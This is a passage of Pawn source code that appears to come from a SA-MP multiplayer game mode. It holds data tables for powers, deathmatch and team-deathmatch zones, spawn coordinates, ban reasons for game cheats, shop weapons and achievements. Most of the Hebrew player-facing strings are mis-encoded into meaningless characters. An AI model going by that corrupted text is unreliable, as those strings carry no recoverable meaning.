	{"/Ghost",		"",		"",		15,	0,	0,	0,		0,		0,		true,	"ыЁщёф ьЄхьэ ф°хчх· / щЎщрф юЄхьэ ф°хчх·"},
	{"/InvScan",	"",		"",		15,	0,	0,	0,		0,		14,		true,	"/invisible ё°щў· фрцх° ю∙чўЁщэ фю∙·ю∙щэ с\n°юф 1 - ё°щўф сшххч ўЎ°\n°юф 2 - ё°щўф сшххч р°хъ\n°юф 3 - ё°щўф сшххч р°хъ юрху"},
	{"/Pump",		"",		"",		16,	1,	3,	8000,	0,		0,		true,	"(ф·чь· ∙рщс· чщщэ юф∙чўя фў°хс рьщъ (сющуф хфхр щ·°чў ф∙рщсф ·хЇёў\nсыь °юф, ф∙рщсф чцўф щх·° хЇхЄь· ьщх·° ю°чў"},
	//{"/Jetp",		"",		"",		19,	0,	0,	0,		0,		0,		false,	"цщюхя ·щў ёщьхя"},
	{"/Raise",		"",		"",		19,	1,	3,	15000,	0,		13,		true,	"ф°ю· ∙чўя срюЎЄх· ·щў ёщьхя сючщ° ь∙Ёщф\n°юф 1 - ф°ю· ∙чўя Єэ ·щў ёщьхя, 2$ ь∙Ёщщф\n°юф 2 - ф°ю· ∙чўя Єэ ·щў ёщьхя, 1$ ь∙Ёщщф\n°юф 3 - ф°ю· ∙чўя Єэ ·щў ёщьхя, чщЁэ"},
	{"/SRaise",		"",		"",		19,	0,	0,	0,		0,		0,		true,	"(/raise) ∙ч°х° ∙чўя ю·Їщёф с·щў ёщьхя"}
};
new UltimatePowers[MAX_UPOWERS][UPEnum] =
{
	{"Earth Power","ыхчх· фюрЇ∙°щэ ∙ьщшф сруюф хсрхсщщўшщэ ф∙хЁщэ ∙ь фю∙чў","руюф - Earth",200000,12,@c(brown),brown,
		{12,	5,		false,	"Rock Throw"},
		{13,	1,		true,	"Underground World"},
		{14,	5,		false,	"Earth Protection"},
		{15,	8,		false,	"Earth Jump"},
		{16,	35,		false,	"Earth Armour"},
		{17,	30,		false,	"Rock Avalanche"},
		{18,	80,		false,	"Earthquake"},
		{19,	150,	false,	"Objects Collision"},
		{20,	250,	false,	"Great Earthquake"}
	},
	{"Fire Power","ыхчх· ь∙ьщшф ср∙, сЇщЎхЎщэ хсчхэ","р∙ - Fire",300000,14,@c(red),red,
		{14,	5,		false,	"Fire Release"},
		{14,	10,		false,	"Fire Ball"},
		{15,	25,		false,	"Self Explosion"},
		{16,	3,		true,	"Fire Zone"},
		{17,	45,		false,	"Wall of Flames"},
		{18,	75,		false,	"Grand Fire Ball"},
		{18,	75,		false,	"Breath of Fire"},
		{19,	200,	false,	"Magma Release"},
		{20,	8,		true,	"Fire Streaming"}
	},
	{"Water Power","ыхчх· ь∙ьщшф сющэ хсў°ч","ющэ - Water",200000,12,@c(blue),blue,
		{12,	5,		false,	"Water Shot"},
		{13,	8,		false,	"Water Shield"},
		{14,	25,		false,	"Wave"},
		{15,	7,		false,	"Freeze"},
		{16,	35,		false,	"Ice Claw"},
		{17,	7,		true,	"Fountain Form"},
		{18,	8,		true,	"Waterfall"},
		{19,	100,	false,	"Double Dolphin"},
		{20,	250,	false,	"Tsunamis"}
	},
	{"Air Power","ыхчх· ь∙ьщшф с°хч хсрхщ°","°хч - Wind",200000,12,@c(grey),grey,
		{12,	5,		false,	"Air Jump"},
		{13,	20,		false,	"Air Bomb"},
		{14,	7,		false,	"Wind Speed"},
		{15,	25,		false,	"Air Blast"},
		{16,	20,		false,	"Using Cloud"},
		{17,	50,		false,	"Going Down"},
		{18,	100,	false,	"Strong Wind"},
		{19,	8,		true,	"Flying"},
		{20,	250,	false,	"Tornado"}
	},
	{"Lightning Power","ыхчх· ь∙ьщшф сс°ўщэ","с°ў - Lightning",250000,12,@c(yellow),yellow,
		{12,	1,		true,	"Lightning Charge"},
		{13,	25,		false,	"Sword of Lightning"},
		{14,	5,		true,	"Lightning Release"},
		{15,	45,		false,	"Lightning Generation"},
		{16,	45,		false,	"Lightning Redirection"},
		{19,	60,		false,	"Lightning Beast"},
		{17,	85,		false,	"Thunder Burn"},
		{18,	125,	false,	"Plasma Ball"},
		{20,	250,	false,	"Thunderstorm"}
	},
	{"Wood Power","ыхчх· ь∙ьщшф сЄЎщэ","ющэ хруюф - Water&Earth",250000,15,@c(green),green,
		{15,	30,		false,	"Wood Hand"},
		{16,	50,		false,	"Cactus Attack"},
		{17,	6,		true,	"Healing Tree"},
		{18,	100,	false,	"Wood Clone"},
		{20,	250,	false,	"The Great Forest"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"}
	},
	{"Energy Power","ыхчх· ь∙ьщшф срЁ°тщф","рЁ°тщф - Energy",250000,15,@c(purple),purple,
		{15,	1,		false,	"Scanning"},
		{16,	0,		true,	"Energy Release"},
		{17,	0,		true,	"Energy Pump"},
		{18,	0,		true,	"Energy Pump Straw"},
		{20,	200,	false,	"The 128"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"},
		{-1,	0,		false,	"None"}
	},
	{"Eye Techniques","ыхчх· ∙хЁщэ фюсхЎЄщэ Єэ ∙щюх∙ сЄщЁщщэ ∙ь фуюх·","рщя - None",500000,17,@c(lightred),lightred,
		{17,	10,		false,	"Teleport Behind Player"},
		{18,	20,		false,	"Player Replace"},
		{19,	20,		false,	"Quick Evasion"},
		{20,	40,		false,	"Red World Illusion"},
		{21,	40,		false,	"Fire Illusion"},
		{22,	50,		false,	"Eye Laser"},
		{23,	120,	false,	"Copy Ultimate Power"},
		{23,	250,	false,	"Erase Circle"},
		{-1,	0,		false,	"None"}
	},
	{"Hand of God","ыхчх· фюрЇ∙°щэ ∙ьщшф с·ЁхЄф хсюфщ°х·","рщя - None",650000,19,@c(orange),orange,
		{19,	35,		false,	"Velocity Up"},
		{19,	35,		false,	"Gravitating"},
		{20,	35,		false,	"Weapon Magnet"},
		{21,	50,		false,	"Insects Attack"},
		{22,	75,		false,	"Animals Attack"},
		{23,	5,		true,	"The Devil Curse"},
		{24,	100,	false,	"Reincarnation"},
		{25,	175,	false,	"Mother Earth"},
		{26,	250,	false,	"Moon Attack"}
	}
};
new upower_MaxLevel[MAX_UPOWERS];
new upower_Title[MAX_UPOWERS][9][25];
new upower_NeededLevel[MAX_UPOWERS][9];
new upower_Cost[MAX_UPOWERS][9];
new bool:upower_TakingEnPS[MAX_UPOWERS][9];
new DMZs[][DMZE] =
{
	// cmd, name, gravity, hp&ar, interior, lvl, usinglevels, maxlevel, worlds
	{"","None",0.008,{100.0,0.0},0,0,false,0,1},
	{"/War","War",0.008,{100.0,100.0},16,0,false,0,50},
	{"/Heavy","Heavy Weapons",0.008,{100.0,100.0},10,0,false,0,2},
	{"/GunGame","Gun Game",0.008,{100.0,0.0},0,0,true,25,1},
	{"/Matrix","Matrix",0.002,{100.0,100.0},15,0,false,0,1},
	{"/MM","Minigun Madness",0.001,{100.0,100.0},0,0,false,0,1},
	{"/GrenMol","Grenade & Molotov",0.008,{100.0,100.0},0,0,false,0,1},
	{"/Fire","Fire Madness",0.001,{100.0,0.0},0,0,false,0,1},
	//{"/UJ","Uzi n Jetpack",0.008,{100.0,0.0},0,18,false,0,1},
	{"/RCWar","RC War",0.008,{100.0,0.0},10,0,false,0,1},
	{"/Shavuot","Shavuot",0.008,{100.0,0.0},0,0,true,4,1},
	{"/Pirates","Pirates",0.008,{100.0,0.0},0,0,false,0,1},
	{"/BoatsDM","Boats DeathMatch",0.008,{100.0,0.0},0,0,false,3,0},
	{"/CBugDM","Desert Eagle CBug",0.008,{100.0,100.0},0,0,false,0,0}
}, DMZsDelay[max_dmzs] = {0,...};
new TDMZs[][TDMZE] =
{
	// cmd, scmd, name, interior, level, health&armour, teams, colors, positions, weapons
	{"","","None",0,0,{100.0,0.0},0,{white,white,white,white},{-1,-1,-1,-1},
		{0,0,0,0},{0,0,0,0},
		{0,0,0,0},{0,0,0,0},
		{0,0,0,0},{0,0,0,0},
		{0,0,0,0},{0,0,0,0}
	},
	{"/teamdm","/tdm","Heavy TDM",0,1,{100.0,0.0},2,{green,red,white,white},{1,2,-1,-1},
		{24,29,31,-1,-1},{100,500,500,-1,-1},
		{22,28,26,-1,-1},{500,500,500,-1,-1},
		{24,25,16,-1,-1},{500,100,1,-1,-1},
		{-1,-1,-1,-1,-1},{-1,-1,-1,-1,-1}
	}
};
new Float:TDMZPositions_Heavy_T1[][4] =
{
	{2190.0813,3440.9927,26.8019,98.2074},
	{2185.7498,3446.8010,26.8019,85.0472},
	{2167.4585,3466.6943,26.8019,87.8672},
	{2142.3625,3444.7637,26.8019,0.4464},
	{2116.0581,3443.4087,26.8019,89.1206},
	{2115.9954,3447.8806,26.8019,84.1073},
	{2114.4570,3455.2776,26.9659,88.1806},
	{2115.0659,3464.0452,26.8019,87.8673},
	{2078.4204,3463.8569,26.8019,91.0007},
	{2122.0835,3465.1689,26.8019,91.6508},
	{2182.3022,3459.9309,26.8019,93.5542}
};
new Float:TDMZPositions_Heavy_T2[][4] =
{
	{1680.6084,3493.7671,26.8219,269.8041},
	{1685.1288,3488.8838,26.8219,269.8041},
	{1697.9276,3473.2786,26.8219,269.8041},
	{1698.2224,3468.4656,26.8219,269.8041},
	{1726.7396,3492.7156,26.8219,275.4442},
	{1782.8884,3475.5576,26.8309,271.6842},
	{1766.6937,3474.5974,28.3232,116.2927},
	{1761.8743,3468.7346,28.3232,30.7519},
	{1755.6090,3473.6172,28.5452,35.4520},
	{1757.8372,3491.5647,26.8219,272.3109},
	{1780.1897,3497.5967,26.8219,179.5633}
};
new Float:TDMZPickups_Heavy[][3] =
{
	{1793.2549,3483.5186,26.6550},
	{1813.9410,3481.6970,26.6436},
	{1855.2710,3482.7273,26.5879},
	{1861.6047,3525.3000,26.4796},
	{1903.6783,3532.9001,26.4987},
	{1940.9838,3529.4875,26.5051},
	{1948.4275,3480.6035,26.4827},
	{1993.2161,3465.6997,26.4715},
	{2043.1375,3454.5950,26.6333},
	{2166.0715,3395.1992,26.4966},
	{2097.3274,3389.5225,26.4916},
	{2015.6910,3393.9509,26.4916},
	{2010.2365,3426.7993,26.4917},
	{1779.1104,3542.8669,26.6592},
	{1700.2025,3546.3811,26.6612}
};
new TDMZPickupNames_Heavy[][32] =
{
	"Godmod",
	"Death",
	"Tank",
	"Small Plane",
	"Large Weapons",
	"Super Power: Fly",
	"Super Power: Water Ball",
	"Super Power: Magnet",
	"Super Power: Laser Eyes"
};
new Options[][OptionsEnum] =
{
	{"Їщ 2 ф°щтх·",false,18,true,hostnameFirst " (DoubleKill!)"}, // 0
	{"фу-∙хш",false,13,true,hostnameFirst " (Headshot Active!)"}, // 1
	{"рщ ЎЇщщф сфхуЄх· ыЁщёф хщЎщрф",false,3,false,""}, // 2
	{"Їщ 3 ф°щтх·",false,20,true,hostnameFirst " (TripleKill!)"}, // 3
	{"Їщ 2 ф°щтх· ьр ю·ысф рхшхюшщ·",false,18,false,hostnameFirst " (DoubleKill!)"}, // 4
	{"Їщ 2 рЁ°тщф",false,18,true,hostnameFirst " (Double Energy!)"}, // 5
	{"∙щтх°щ хщрщЇщ",false,15,true,""}, // 6
	{"ф°щтх· срцх° фющЁщтря",false,15,true,""}, // 7
	{"Ў'рш сЎсЄщэ",false,8,true,""}, // 8
	{"∙щш· 2-2 юсхшь·",false,18,true,""}, // 9
	{"щ°щщф фх°т· сёЁщщЇ°",false,13,true,hostnameFirst " (!щ°щф сёЁщЇ°)"}, // 10
	{"·Ўхт· рхсщщўшщэ ьыхьэ",false,18,false,""}, // 11
	{"сщшхь ёрхЁущэ",false,3,false,""}, // 12
	{"сщшхь ьрт-∙хшщЁт",false,18,false,""}, // 13
	{"Ї·щч· рцх° шщ-ущ-рэ",false,8,false,""}, // 14
	{"°р∙ ф∙°·", false,15,true,""}, // 15
	{"юьчюх· ўьрЁщэ - фр°уўх°",false,18,true,hostnameFirst " (Hardcore CW!)"} // 16
};
new BanReasons[11][3][110] =
{
	{"gm",	"Cheat: Godmod",			".хьыя фх∙Є· юя ф∙°· Godmod фЇЄь· Ў'щш юёхт"},
	{"nr",	"Cheat: No Weapon Reload",	".хьыя фх∙Є· юя ф∙°· No Weapon Reload фЇЄь· Ў'щш юёхт"},
	{"s",	"Cheat: Speedhack",			".хьыя фх∙Є· юя ф∙°· Speedhack фЇЄь· Ў'щш юёхт"},
	{"sh",	"Cheat: Speedhack",			".хьыя фх∙Є· юя ф∙°· Speedhack фЇЄь· Ў'щш юёхт"},
	{"ab",  "Cheat: Airbreak",			".хьыя фх∙Є· юя ф∙°· Airbreak фЇЄь· Ў'щш юёхт"},
	{"w",	"Cheat: Weapons",			".хьыя фх∙Є· юя ф∙°· Weapons фЇЄь· Ў'щш юёхт"},
	{"wh",	"Cheat: Weapons",			".хьыя фх∙Є· юя ф∙°· Weapons фЇЄь· Ў'щш юёхт"},
	{"ad",	"Ї°ёхэ ∙°·щэ ю·ч°щэ",		".Єь ыъ ∙фЇ°· рщёх° цф фх∙Є· юя ф∙°· .SAMP-IL сўфщь·щЁх щ∙ рщёх° Єь Ї°ёхэ ы·хсх· ∙ь ўфщьх· ∙рщЁя юшЄэ"},
	{"l",	"ю°юф р· юЄ°ы· ф°юх·",		".°щющ· р· юЄ°ы· ф°юх· (щЎ°· ф°щтх· сЎх°ф ∙рщЁф юх·°·) хьыя фх∙Є· юя ф∙°·"},
	{"lvl",	"ю°юф р· юЄ°ы· ф°юх·",		".°щющ· р· юЄ°ы· ф°юх· (щЎ°· ф°щтх· сЎх°ф ∙рщЁф юх·°·) хьыя фх∙Є· юя ф∙°·"},
	{"sk",  "Spawn Kill",				".ф°т· ∙чўЁщэ с·чщь·х ∙ь ∙щтх° рх сёЇрхя хьыя фх∙Є· юя ф∙°·"}
};
new ewars[][ewarenum] =
{
	{"Forest of Death","!щЄ° фюхх·: ьыь ∙чўя 5%% чщщэ хыхьэ юўсьщэ рўуч, фрч°хя ∙Ё∙р° чщщ юЁЎч"},
	{"Fight! Fight! Fight!","!ў°с юых·: ыхьэ Єь ыхьэ"}
};
new Float:EWarPositions[][4] =
{
	{-1630.4589,-2246.6050,31.4766,2.1640},
	{-1635.4592,-2247.4443,31.4766,0.0112},
	{-1635.4175,-2233.4148,31.4766,182.6850},
	{-1631.2687,-2232.3347,31.4766,180.6797},
	{-1640.8130,-2246.7100,31.4766,1.6824},
	{-1633.3732,-2237.3955,37.3921,353.3268},
	{-1644.3187,-2274.9487,35.8668,58.2206},
	{-1622.2750,-2255.6570,31.3731,322.5387},
	{-1580.3990,-2223.5193,16.5725,52.7795},
	{-1606.9193,-2199.4834,24.1265,81.1887},
	{-1635.7344,-2206.5789,31.5344,146.6968},
	{-1725.5859,-2269.7937,48.9138,68.1539},
	{-1731.0959,-2282.9836,47.9723,158.1540},
	{-1752.7866,-2278.5918,52.6659,71.4962},
	{-1759.8301,-2265.3762,57.0338,71.4962},
	{-1752.4645,-2254.8540,58.0600,317.5253}
};
new Float:EWarPositions2[][4] =
{
	{1659.2836,-1631.9183,83.7813,145.9442},
	{1659.8621,-1634.3588,83.7813,182.5001},
	{1659.5840,-1636.0427,83.7813,163.6999},
	{1658.8715,-1638.4792,83.7788,163.6999},
	{1658.2229,-1640.6978,83.7788,163.6999},
	{1655.4170,-1641.8904,83.7813,73.6998},
	{1652.2842,-1641.2126,83.7813,73.6998},
	{1650.0658,-1640.5641,83.7788,73.6998},
	{1649.3604,-1638.4971,83.7813,343.6999},
	{1648.0811,-1636.0670,83.7813,28.6999},
	{1648.5835,-1634.1404,83.7813,343.6999},
	{1649.8800,-1632.2290,83.7813,343.6999},
	{1650.8539,-1631.7114,83.7813,278.5899},
	{1653.3151,-1631.1836,83.7813,278.0677},
	{1655.9364,-1630.8121,83.7813,278.0677},
	{1655.2928,-1633.8101,83.7813,143.0676},
	{1653.2957,-1634.1388,83.7813,98.0677},
	{1653.1506,-1636.7212,83.7813,188.0676},
	{1655.6019,-1637.1246,83.7813,278.0677},
	{1654.3234,-1635.9487,83.7813,62.9101},
	{1656.9490,-1640.2295,83.7788,217.7547},
	{1654.8003,-1640.3199,83.7788,72.2217},
	{1659.5863,-1636.6296,83.7813,27.2216}
};
new cupowers[][ClanUPEnum] =
{	// name, energy, time, cost, uid
	{"Team Healing",		10,		3,	5000,		0},
	{"Fire Area",			25,		3,	10000,		1},
	{"Full Ammo",			25,		4,	15000,		2},
	{"HQ Explosion",		50,		5,	25000,		3},
	{"Water Shield",		65,		5,	30000,		4},
	{"Earth Energy",		80,		6,	35000,		5},
	{"X2 Damage",			100,	7,	50000,		6},
	{"Coloured Circle",		180,	7,	65000,		7},
	{"Infinite Health",		220,	8,	80000,		8}/*,
	{"Summon Clan God",		400,	10,	2000000,	9}*/
};
//new clanWarTypes[][32] = {"Classic", "Cops N' Gangs", "Counter Strike"};
new Float:ClanWarPositions1[][4] =
{
	{-1309.9203,2491.5503,89.8672,5.6109},
	{-1321.0635,2503.2729,89.5703,71.0748},
	{-1316.5717,2503.0649,89.5703,266.8141},
	{-1321.1691,2512.3755,92.5406,359.0074},
	{-1324.8051,2528.4211,89.9844,176.6457},
	{-1334.9470,2525.6763,87.0469,338.3038},
	{-1308.1637,2544.1873,87.7422,353.3439},
	{-1304.1038,2552.3918,90.3281,257.2222}
};
new BotMessages[MAX_BOTMSG][M_S], botMs = 0;
new chatKeywords[][chatKeywordsEnum] =
{
	//{"рчхц","%%"},
	{"∙\"ч","д"},
	{"<v>",version},
	{"<ts>",talkprogramip},
	{"<web>",webpage},
	{"ЁрЇщўё","ЁрЇщё"}
};
new phoneTypes[][PhoneEnum] =
{
	{"Ї∙хш","ыхьь рхЇЎщщф ьф·ў∙° сьсу",2000},
	{"ю·ўуэ","Єэ ·Ї°щш хф°сф рЇ∙°хщх·",4000},
	{"ю·ўуэ юрху","ю·ўуэ ььр ·∙ьхэ Єь ∙щчх·",15000}
};
new warGames[][WarGamesEnum] =
{
	{"/sawnpro","Sawn Pro",{26,22,wtype_microsmg,-1,-1,-1,-1,-1,-1,-1},{10000,10000,10000,0,0,0,0,0,0,0},8,-1,"SawnOff Shotgun юьчюф Єэ фЁ∙ў",1},
	{"/hfight","Heavy Fight",{wtype_pistol,27,wtype_assault,wtype_sniper,-1,-1,-1,-1,-1,-1},{10000,10000,10000,10000,0,0,0,0,0,0},7,-1,"юьчюф Єэ Ё∙ўщэ ысущэ",2},
	{"/cw","Combat Wars",{23,27,-1,-1,-1,-1,-1,-1,-1,-1},{10000,10000,0,0,0,0,0,0,0,0},7,-1,"Combat Shotgun юьчюф Єэ фЁ∙ў",3},
	{"/mini","Minigun Madness",{38,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,0,0,0,0,0,0,0,0,0},9,-1,"Minigun ,юьчюф Єэ фЁ∙ў фыщ чцў сю∙чў",3},
	{"/eweapon","Every-Weapon Fight",{9,24,27,29,31,34,16,35,-1,-1},{0,1,2,4,4,1,1,1,0,0},8,-1,"юьчюф Єэ ыь фЁ∙ўщэ фшхсщэ сю∙чў",4},
	{"/deagle","Desert Eagle Fight",{24,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,0,0,0,0,0,0,0,0,0},10,-1,"юьчюф Єэ фрўуч фчцў сщх·°",5},
	{"/iraq","Iraq War",{22,29,30,-1,-1,-1,-1,-1,-1,-1},{10000,10000,10000,-1,-1,-1,-1,-1,-1,-1},2,-1,"юьчю· Єщ°ў Єэ ыюф Ё∙ўщэ",6},
	{"/saw","Chainsaw",{9,-1,-1,-1,-1,-1,-1,-1,-1,-1},{0,-1,-1,-1,-1,-1,-1,-1,-1,-1},3,168,"юьчю· юёх°щэ",7},
	{"/throw","Throw Weapons",{wtype_throw,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,-1,-1,-1,-1,-1,-1,-1,-1,-1},3,167,"юьчюф сЁ∙ўщэ ьц°щўф",8},
	{"/micro","MicroSMG Fight",{wtype_microsmg,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,-1,-1,-1,-1,-1,-1,-1,-1,-1},6,-1,"юьчюф сЁ∙ўщэ ўьщэ - Єхцщ рх шщщў9",9},
	{"/assault","Assault",{wtype_assault,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,-1,-1,-1,-1,-1,-1,-1,-1,-1},2,-1,"юьчю· рю4 рх рщўщ47 срцх° Єщ°ў",10},
	{"/sniper","Snipers",{wtype_sniper,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,-1,-1,-1,-1,-1,-1,-1,-1,-1},5,-1,"юьчюф сЁ∙ўщ ЎьЇщэ",11},
	{"/rpg","RPG",{wtype_rpg,-1,-1,-1,-1,-1,-1,-1,-1,-1},{10000,-1,-1,-1,-1,-1,-1,-1,-1,-1},4,264,"юьчюф сю∙т°щ шщьщэ",12},
	{"/katana","Katana",{8,-1,-1,-1,-1,-1,-1,-1,-1,-1},{0,-1,-1,-1,-1,-1,-1,-1,-1,-1},11,49,"юьчю· ч°сх·",13},
	{"/soldiers","Soldiers",{16,29,30,-1,-1,-1,-1,-1,-1,-1},{1,10000,10000,-1,-1,-1,-1,-1,-1,-1},12,287,"юьчю· чщщьщэ",14}
};
new ManhuntTypes[][ManhuntEnum] =
{
	{"/commando","Commando",team_manhunt,
		green,{23,-1,-1,-1,-1},{1000,0,0,0,0},50.0,0.0,0,
		red,{24,27,31,16,38},{1000,1000,1000,5,50},100.0,100.0,179,
		"!ыь ф∙чўЁщэ ∙фЎш°Їх ьЇЄщьх· ю∙чўщэ Ёту ∙чўя рчу чцў сющхчу",1},
	{"/manhunt","Man Hunt",team_manhunt,
		green,{23,25,29,-1,-1},{1000,1000,1000,0,0},100.0,0.0,-1,
		red,{24,29,-1,-1,-1},{1000,1000,0,0,0},100.0,100.0,-1,
		"!ыь ф∙чўЁщэ фщ°хўщэ юўсьщэ ю∙щюф ьЎху ∙чўя рчу рухэ",2}
};
new Float:ManhuntCommandoPositions[][4] =
{
	{630.0980,1254.4504,11.6932,300.0105},
	{634.8263,1246.6638,11.6920,298.6848},
	{641.4798,1235.8241,11.6897,299.6248},
	{634.5170,1228.8243,11.7113,215.6506},
	{622.0939,1224.3275,11.7188,117.8897},
	{616.0030,1234.9662,11.7188,117.8897},
	{608.8235,1247.6312,11.7188,117.8897},
	{601.8922,1260.0902,11.7188,117.8897},
	{602.5147,1267.5474,11.7188,27.8896},
	{614.4144,1274.4440,11.7113,22.3221},
	{620.3019,1271.5885,11.7113,285.0919}
};
new Float:LVManhuntPositions[][3] =
{
	{1958.3783,1343.1572,15.3746},
	{2199.6531,1393.3678,10.8203},
	{2483.5977,1222.0825,10.8203},
	{2637.2712,1129.2743,11.1797},
	{2000.0106,1521.1111,17.0625},
	{2024.8190,1917.9425,12.3386},
	{2261.9048,2035.9547,10.8203},
	{2262.0986,2398.6572,10.8203},
	{2244.2566,2523.7280,10.8203},
	{2335.3228,2786.4478,10.8203},
	{2150.0186,2734.2297,11.1763},
	{2158.0811,2797.5488,10.8203},
	{1969.8301,2722.8564,10.8203},
	{1652.0555,2709.4072,10.8265},
	{1564.0052,2756.9463,10.8203},
	{1271.5452,2554.0227,10.8203},
	{1441.5894,2567.9099,10.8203},
	{1480.6473,2213.5718,11.0234},
	{1400.5906,2225.6960,11.0234},
	{1598.8419,2221.5676,11.0625},
	{1318.7759,1251.3580,10.8203},
	{1558.0731,1007.8292,10.8125},
	{1705.2347,1025.6808,10.8203},
	{968.8336,1805.8030,8.6484}
};
new spAmmunation[][SpAmmunationEnum] =
{
	// name, 					id,				cost,	weaponid,	ammo,	object,		level,  saved,	text
	{"None",					spw_none,		0,		0,			0,		false,		0,		false,	" .рщя ьъ ∙хэ Ё∙ў ющхчу"},
	{"Great Grenade",			spw_ggrenade,	2500,	16,			3,		true,		8,		false,	" .ф∙·ю∙ с°щюхя фЄЁў ыущ ьщЎх° ыюх· ЇщЎхЎщэ тухьф срцх° юёхщщэ"},
	{"Smoke Grenade",			spw_smoke,		1200,	17,			3,		true,		5,		false,	" .ыр∙° ·∙·ю∙ с°щюхя фЄ∙я, щщххЎ° юёъ Є∙я ў°хс рьщъ ыъ ∙·хыь ьёт· рх ь·ўхє сфЇ·Єф"},
	{"Super Hammer",			spw_hammer,		2000,	5,			0,		true,		6,		false,	" .Єэ фЇшщ∙ фЄЁў ·хыь ьфЄщє °ысщэ х∙чўЁщэ сюыф рч·"},
	{"Poison Sniper",			spw_psniper,	1700,	33,			3,		false,		10,		false,	" .(°хсф фЎьЇщэ ∙ьъ ыхьь °Єь с·хых: ыь ющ ∙··ўхє, щюх· срх·х ф°тЄ (ф°Єь ючцў р· фЁ∙ў"},
	{"Double M4",				spw_doublem4,	2200,	31,			100,	true,		6,		false,	" !ы∙щ∙ ьъ ∙Ёщщэ ююЁх M4 ф°сф щх·° ўь ьчх°° Єэ"},
	{"Grand RPG",				spw_grandrpg,	3500,	35,			3,		true,		12,		false,	" .сцхўф ЄЁўщ·! фЁ∙ў фюЇхЎї сщх·° сю∙чў"},
	{"Taser",					spw_taser,		2000,	1,			0,		true,		5,		false,	" .срюЎЄх· шщщц° ч∙юьщ ·хыьх ьЇтхЄ срЁ∙щэ хьюЁхЄ юфэ ьцхц ьыюф ∙Ёщх·"}
};
new Achievements[][AchievementsEnum] =
{
	{"Єу 10 ф°щтх·","ф∙чўя Ў°щъ ьф°хт 10 ∙чўЁщэ ·хъ уўф",60,250,10,{-1,-1,-1},{PLAYER_STATE_ONFOOT,PLAYER_STATE_DRIVER,PLAYER_STATE_PASSENGER}},
	{"Єу 50 ф°щтх·","ф∙чўя Ў°щъ ьф°хт 50 ∙чўЁщэ ·хъ 4 хчЎщ уўх·",250,1750,50,{-1,-1,-1},{PLAYER_STATE_ONFOOT,PLAYER_STATE_DRIVER,PLAYER_STATE_PASSENGER}},
	{"юьъ фёрхя","ф∙чўя Ў°щъ ьф°хт 12 ∙чўЁщэ ·хъ уўф Єэ фЁ∙ў ∙хштря-ёрхярхє",60,270,12,{26,-1,-1},{PLAYER_STATE_ONFOOT,PLAYER_STATE_PASSENGER,-1}},
	{"юьъ фрю4","ф∙чўя Ў°щъ ьф°хт 8 ∙чўЁщэ ·хъ уўф Єэ фЁ∙ў рю4",60,270,8,{31,-1,-1},{PLAYER_STATE_ONFOOT,PLAYER_STATE_PASSENGER,-1}},
	{"ю∙щю· фу°щщс-сщщ","ф∙чўя Ў°щъ ьф°хт 15 ∙чўЁщэ ·хъ уўф ы∙фхр с°ыс",60,270,15,{-1,-1,-1},{PLAYER_STATE_DRIVER,PLAYER_STATE_PASSENGER,-1}}
};
new Float:Sport1Spawns[][4] =
{
	{1316.7849,2113.7473,11.0156,270.6514},
	{1317.8594,2147.1267,11.0234,266.2647},
	{1321.5922,2138.5073,11.0234,275.6648},
	{1321.6688,2125.8418,11.0156,260.6248},
	{1324.7137,2131.9268,11.0156,270.3381},
	{1379.2733,2142.4929,11.0156,90.7965},
	{1378.4940,2123.2280,11.0156,71.9963},
	{1374.6749,2135.2102,11.0156,92.8215},
	{1373.9142,2126.9180,11.0156,92.1949},
	{1371.2040,2130.5769,11.0156,93.4482}
};
new Float:Sport2Spawns[][4] =
{
	{2770.0149,-2024.0449,13.5547,268.4930},
	{2769.9846,-2019.5792,13.5547,275.6272},
	{2769.9570,-2013.8298,13.5547,275.6272},
	{2775.6570,-2014.7781,13.5547,255.3329},
	{2775.8110,-2022.9293,13.5547,278.5923},
	{2793.9089,-2015.1718,13.5547,96.1814},
	{2793.1633,-2019.8431,13.5620,88.9747},
	{2793.1069,-2024.1597,13.5620,92.7347},
	{2788.2896,-2016.4792,13.5547,87.4080},
	{2788.5093,-2022.7773,13.5620,90.8547}
};
new army[][ArmyEnum] =
{
	{"Hydra",520},
	{"Hunter",425},
	{"Rhino (Tank)",432},
	{"Random",-1}
};
new Float:ArmyPositions[][4] =
{
	{336.7268,1990.5693,17.6512,88.2294},
	{338.8486,1965.0789,17.6514,88.8853},
	{344.1969,1942.6006,17.6515,86.6117},
	{337.8995,1913.2462,17.6514,87.0169},
	{331.7592,1848.7202,17.6536,93.3381},
	{335.5576,1818.9106,17.6575,93.0322},
	{300.6183,1832.8173,17.6513,1.6254},
	{299.3784,1876.4415,17.6517,1.6275},
	{304.2973,1956.9635,17.6512,5.8934},
	{300.7839,2032.6179,17.6511,2.4635},
	{266.9687,2060.7739,17.6514,89.7466},
	{239.5360,2036.4036,17.6521,176.4252},
	{235.9093,1974.8055,17.6513,175.4378}
};
new BattleStyles[][BattleStyleEnum] =
{
	{"Any weapon",{99,-1,-1,-1,-1}},
	{"Sawnoff & MicroSMG: 4-4 Style",{26,100+wtype_microsmg,-1,-1,-1}},
	{"Sawnoff: 2-2 Style",{22,26,-1,-1,-1}},
	{"Heavy Weapons",{24,27,31,-1,-1}},
	{"Heavy Weapons (+Sniper)",{24,27,31,34,-1}},
	{"Assistants",{27,32,-1,-1,-1}},
	{"Snipers",{24,29,31,34,-1}},
	{"Terror",{100+wtype_throw,100+wtype_rpg,-1,-1,-1}}
};
new VBattleStyles[][VBattleStyleEnum] =
{
	{"Hydra Fire",520,1000.0,{-68.1992,2503.0544,17.2076,269.9298},{422.2193,2506.7285,17.2076,91.0202}},
	{"Hunter Attack",425,1500.0,{-266.5355,1542.8385,75.8993,63.0604},{-682.9034,1545.6899,83.3689,33.3950}},
	{"Rustler Invasion",476,1000.0,{-266.5355,1542.8385,75.8993,63.0604},{-682.9034,1545.6899,83.3689,33.3950}},
	{"Sea & Air Sparrow Attack",447,1500.0,{2378.4829,579.4445,7.8099,86.1003},{2253.7954,574.9471,7.8015,272.4258}},
